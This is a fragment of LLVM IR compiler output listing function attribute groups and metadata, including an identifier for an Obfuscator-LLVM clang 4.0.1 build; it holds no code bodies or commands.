attributes #5 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { nounwind readonly }
attributes #15 = { nounwind readnone }
attributes #16 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146506763}
!2 = !{i32 -2146505635}
!3 = !{i32 -2146504195}
!4 = distinct !{!4, !5}
!5 = !{!"llvm.loop.unroll.disable"}
!6 = !{i32 -2146503256}
!7 = !{i32 -2146502167}
